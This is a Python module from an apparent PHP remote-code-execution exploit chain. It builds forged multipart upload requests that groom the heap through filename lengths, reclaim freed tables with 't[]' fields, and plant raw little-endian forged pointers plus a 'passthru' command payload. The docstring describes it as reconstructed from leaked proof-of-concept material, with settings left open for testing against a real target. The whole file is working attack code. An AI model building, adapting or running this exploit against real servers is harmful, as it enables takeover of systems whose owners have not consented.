#!/usr/bin/env python3
"""Module "COMPACT" — rearm/re-grab body + final forged multipart (compact tail).

RECONSTRUCTED from zer061 shape docs + LEAK module spec; NOT the author's original;
per-build semantics marked VERIFIED (mined docs) / INFERRED.

Consumed by php2shell.py attempt():
  COMPACT.BOUNDARY              Content-Type boundary of the rearm and final
                                requests (php2shell.py:211,242). Both exchanges
                                are framed by php2shell.multipart_request with
                                Cookie PHPSESSID=rearm<ordinal>{a,b}, so the
                                bodies carry NO PHPSESSID field — the sid is a
                                Cookie header only (VERIFIED by framing).
  COMPACT.ARM_FILENAME_LENGTH   shared large-filename length used by both the
                                STOCK arm (php2shell.py:185) and the rearm
                                (php2shell.py:206).
  COMPACT.arm_body(False, ARM_FILENAME_LENGTH, 149)  rearm/re-grab multipart,
                                sent on the SAME keep-alive socket as the
                                successful leak probe (php2shell.py:215-216).
  COMPACT.probe_body(15 args)   final forged multipart, sent on a fresh
                                Connection: close socket (php2shell.py:221-246).
                                The driver's own run metadata records
                                final_parts=116 (php2shell.py:265).

Per-semantics provenance
VERIFIED (mined docs — zer061 bundle + LEAK module + freeze_battery):
  - Part grammar: --B CRLF / Content-Disposition: form-data; name="x"
    [; filename="y"] CRLF CRLF value (+ each caller appends CRLF)
    (poc0_109618.py:56-60, poc1_109619.py:48-52, php_up_framework.py:90-94);
    the exact 258-byte trigger body shows the same CRLF accounting
    (poc_trigger.py:38-53); a single-byte filename ("a") avoids the
    PHP_UPLOAD_ERROR_D path (VALIDATION.md:81).
  - Filename strategy is F-repetition followed by length, and the length IS the
    groom parameter: LEAK arm F*262144 / LEAK probe markers F*39 and F*39
    (native-output-leak.py:41-42,50).
  - The community reclaim grammar is name="t[]" FIELD parts carrying forged
    records: 149 x t[] — "149 t[] parts are the packed natural table (nTableSize
    256, 320-byte string bins)" (poc0_109618.py:10-11,85-88;
    poc1_109619.py:11,65-67; php_up_framework.py:113-114). Field entries beyond
    the capacitor do not touch max_file_uploads, unlike file parts.
  - FORGED-POINTER ENCODING: raw little-endian struct.pack("<Q", value) inside
    the reclaim records — poc0_109618.py:38-53 and php_up_framework.py:70-87
    pack the call pointer at fixed record offsets; never ASCII hex strings; the
    record is then REPEATED into every reclaim part (repeater-per-part choice).
    The compact final mirrors the raw-LE choice, and mixes ASCII command bytes
    with packed pointers exactly like zero61's "system\\0<cmd>" plant
    (offset 200, poc0_109618.py:51-52).
  - Upload-progress machinery needs the USP field; the LEAK probe keeps TWO file
    parts with F*39 filenames (native-output-leak.py:47-52) — the (n2, f1, f2)
    argument triple mirrors exactly that (n2=2, f1=f2=39 at the call site).
  - max_file_uploads is 20 on the measured lab stack; file parts beyond the cap
    are parsed but never uploaded; and a body > 8M aborts pre-machinery on fpm
    here, so outside the 8M budget the machinery never engages
    (freeze_battery, measured). All sizes below are bounded accordingly.
  - ordinal semantics: PROFILE["dso_deltas"][ordinal] selects the DSO delta and
    dso_base = main - delta at the call site (php2shell.py:54,204), so the
    (target, dso_base, stage_delta) triple already encodes the ordinal choice.
    payload semantics: the passthrough command reference string
    ("passthrough-<command>", e.g. "passthrough-id"); the driver-side mode
    string is produced by command_mode() as "passthru-<command>"
    (php2shell.py:171) — the body embeds whatever string is handed in.

INFERRED (choices with no direct doc statement; kept explicit for A/B on a
real target — see also the TODO list in the final reconstruction report):
  - BOUNDARY value b"B7kQcompact": pattern of the zero61 family
    b"B7kQpoc618"/b"B7kQpoc619" (poc0_109618.py:64, poc1_109619.py:56).
  - ARM_FILENAME_LENGTH = 262144 == the LEAK stock-arm default
    --large-filename-length (native-output-leak.py:171); 20 such parts stay
    ~5.25MB < 8M.
  - arm_body: file parts capped at 20 (min(parts, MAX_FILE_UPLOADS)); the
    requested remainder (149-20 = 129 at the driver call) becomes t[] filler
    FIELD parts so the reclaim wing (file parts + t[] fillers) equals `parts`
    while no upload state is consumed (this maps the zero61 "149 t[]" reclaim
    grammar onto the measured max_file_uploads=20 cap). Interior part total at
    the driver call = reclaim wing (149) + the USP field = 150.
  - arm_body USP value b"MMM" (the LEAK stock-arm value); rearm ordering
    USP-field -> file parts -> t[] fillers -> closing (LEAK-style order; poc1's
    t[]-first rationale applies to mid-stream free windows, which a fully sent
    rearm body does not have).
  - no_close_flag True -> closing boundary omitted (unterminated multipart
    variant; freeze_battery keeps such a variant as a shape lever). The driver
    call passes False, so the closing terminator is present.
  - probe_body filler filename length cycles s1/s2 by part parity (filename
    "lengths + repetition" groom, compact sizes 8000/6000 at the call site).
  - probe_body forged pointers are planted one raw-LE u64 t[] field each
    (target, then dso_base, then stage_delta), positioned directly after the
    filler section and before the ordinal/payload tail — rather than one
    288-byte record repeated everywhere (zero61's repeater). The raw-LE
    encoding is the mirrored choice; the one-field-per-pointer spread is
    INFERRED.
  - b2 toggles an extra t[] spray wave (parts entries); the driver call has
    b2=False (wave omitted). b3 toggles the payload field; the driver call has
    b3=True (payload present, last content part before the closing boundary).
  - final part-count accounting: at the exact driver argument values the body
    carries 1 (USP) + 2 (markers) + parts=100 (fillers) + 3 (pointers) +
    1 (ordinal marker) + 1 (payload) = 108 interior parts + closing terminator;
    the author's run metadata says final_parts=116 (php2shell.py:265). The +8
    structural difference is not recoverable from the mined docs (open TODO).

Size note (measured constraint — applies to every builder below):
    rearm  ~5.26 MB  (20 files F*262144 + 129 t[]"T" fillers)
    final  ~0.72 MB  (2 markers F*39 + 100 fillers cycling 8000/6000)
both far below the 8M abort-pre-machinery budget on this stack.
"""

import struct

BOUNDARY = b"B7kQcompact"
ARM_FILENAME_LENGTH = 262144
MAX_FILE_UPLOADS = 20        # measured max_file_uploads cap on the lab stack
POST_MAX_SIZE = 8 * 1024 * 1024  # measured; body > 8M aborts pre-machinery

_U64 = 0xFFFFFFFFFFFFFFFF
_MARKER = b"\r\n--" + BOUNDARY + b"\r\n"  # zero61-style collision tripwire


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def file_part(index: int, filename: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="file'
        + str(index).encode()
        + b'"; filename="' + filename + b'"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nX\r\n"
    )


def _u64(value: int) -> bytes:
    """Raw little-endian u64 — the zero61 forge() pointer encoding."""
    return struct.pack("<Q", value & _U64)


def arm_body(no_close_flag: bool, filename_length: int, parts: int) -> bytes:
    """Rearm / re-grab multipart (multipart only).

    parts is the requested count of the RECLAIM WING — file parts + t[] filler
    fields — echoed from zero61's N149 grammar ("149 t[] parts are the packed
    natural table"). File parts are capped at MAX_FILE_UPLOADS (20, measured
    max_file_uploads: beyond the cap parts are parsed but never uploaded);
    every remaining entry up to `parts` is represented as a t[] filler FIELD
    part (zero61 reclaim grammar). Interior part total = parts + 1 (USP field).

    Shape at the driver call (False, 262144, 149):
      1 x PHP_SESSION_UPLOAD_PROGRESS field  (value b"MMM")   [INFERRED value]
      20 x file parts name="file<i>" filename F*262144   } reclaim wing = 149
      129 x t[] filler fields (value b"T")               }
      closing --BOUNDARY--\r\n   (omitted only when no_close_flag=True)
    """
    if parts < 1 or filename_length < 1:
        raise ValueError("parts and filename_length must be >= 1")
    file_count = min(parts, MAX_FILE_UPLOADS)
    filler_count = parts - file_count
    segments = [field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM")]
    for index in range(file_count):
        segments.append(file_part(index, b"F" * filename_length))
    for _ in range(filler_count):
        segments.append(field(b"t[]", b"T"))
    if not no_close_flag:
        segments.append(b"--" + BOUNDARY + b"--\r\n")
    body = b"".join(segments)
    if len(body) >= POST_MAX_SIZE:
        raise ValueError("rearm body would exceed the measured 8M budget")
    return body


def probe_body(parts: int, f1: int, f2: int, field_len: int, b1: bool, n2: int,
               s1: int, s2: int, b2: bool, b3: bool, target: int, dso_base: int,
               stage_delta: int, ordinal: int, payload: str) -> bytes:
    """Final forged multipart (driver metadata: final_parts=116).

    Byte layout top-to-bottom (part order is the byte order):
      [b1]   USP field, value b"M" * field_len
      [n2]   marker file parts, filename F*f1 (index 0) then F*f2
             — f1=f2=39, n2=2 mirrors LEAK.probe_body's two F*39 parts exactly
      parts  filler file parts, name="file<n2+i>", filename F-length cycling
             s1 (even i) / s2 (odd i)
      [b2]   optional t[] spray wave (parts entries, value b"T"); OFF in the
             driver call (b2=False)
      [always] FORGED-POINTER FIELD BLOCK — the three values packed raw
             little-endian u64 (mirrored zero61 forge() encoding), one t[]
             field per value, in order: target, dso_base, stage_delta.
             ORDER IN BYTES: immediately after the filler section, before the
             ordinal/payload tail:
               t[]      <- struct.pack("<Q", target)
               t[]      <- struct.pack("<Q", dso_base)
               t[]      <- struct.pack("<Q", stage_delta)
      [always] ordinal marker field, name=b"ord<i>", value=b"<i>"
      [b3]   payload field, name=b"payload", value=payload.encode()
             ("passthrough-<command>" reference) — LAST content part before
             the closing boundary
      [always] closing --BOUNDARY--\r\n

    target/dso_base/stage_delta semantics per the call site: target = main +
    PROFILE target_offset, dso_base = main - dso_deltas[ordinal], stage_delta =
    stage - target (php2shell.py:145-154,203-204); the values are runtime
    addresses/offsets of the frozen machinery record, embedded so the forged
    request lands the machinery on the leaked main chunk.
    """
    if parts < 0 or n2 < 0 or field_len < 0:
        raise ValueError("parts/n2/field_len must be non-negative")
    if n2 and (f1 < 1 or f2 < 1):
        raise ValueError("marker filename lengths must be >= 1")
    if parts and (s1 < 1 or s2 < 1):
        raise ValueError("filler filename lengths must be >= 1")
    if not isinstance(payload, str):
        raise ValueError("payload must be a str")
    segment: list[bytes] = []
    if b1:
        segment.append(field(b"PHP_SESSION_UPLOAD_PROGRESS", b"M" * field_len))
    for index in range(n2):
        marker_length = f1 if index == 0 else f2
        segment.append(file_part(index, b"F" * marker_length))
    for offset in range(parts):
        filler_length = s1 if offset % 2 == 0 else s2
        segment.append(file_part(n2 + offset, b"F" * filler_length))
    if b2:
        for _ in range(parts):
            segment.append(field(b"t[]", b"T"))
    # --- forged-pointer field block (raw little-endian u64 each) ---
    for name_value in (
        (b"target", target),
        (b"dso_base", dso_base),
        (b"stage_delta", stage_delta),
    ):
        blob = _u64(name_value[1])
        if _MARKER in blob:  # 13-byte marker cannot fit into 8 bytes, belt+braces
            raise ValueError("forged pointer collides with the multipart marker")
        segment.append(field(b"t[]", blob))
    segment.append(field(b"ord" + str(ordinal).encode(), str(ordinal).encode()))
    if b3:
        command = payload.encode()
        if _MARKER in command:
            raise ValueError("payload collides with the multipart marker")
        segment.append(field(b"payload", command))
    segment.append(b"--" + BOUNDARY + b"--\r\n")
    body = b"".join(segment)
    if len(body) >= POST_MAX_SIZE:
        raise ValueError("final body would exceed the measured 8M budget")
    return body
